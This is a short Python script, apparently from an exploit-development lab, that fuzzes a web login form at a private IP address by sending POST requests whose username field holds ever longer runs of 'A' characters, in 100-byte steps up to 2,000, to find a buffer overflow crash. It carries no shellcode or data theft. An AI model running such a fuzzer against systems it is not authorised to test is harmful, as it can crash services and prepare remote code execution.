#!/usr/bin/python3
import socket
import sys

size = 100
while(size < 2000):
    try:
        print(f"\nSending evil buffer with {size} bytes.")
        inputBuffer = "A" * size # first payload will be 100 A's

        payload = "username=" + inputBuffer + "&password=aaaa"

        buffer = "POST /login HTTP/1.1\r\n"
        buffer += "Host: 192.168.1.160\r\n"
        buffer += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\n"
        buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
        buffer += "Accept-Language: en-US,en;q=0.5\r\n"
        buffer += "Accept-Encoding: gzip, deflate\r\n"
        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += "Content-Length: " + str(len(payload)) + "\r\n"
        buffer += "Origin: http://192.168.1.160\r\n"
        buffer += "Connection: close\r\n"
        buffer += "Referer: http://192.168.1.160/login\r\n"
        buffer += "Upgrade-Insecure-Requests: 1\r\n"
        buffer += "\r\n"
        buffer += payload

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.1.160", 80))
        s.send(buffer.encode())
        print(s.recv(4096).decode())

        s.close()

        size += 100
    except:
        print("Could not connect")
        sys.exit()
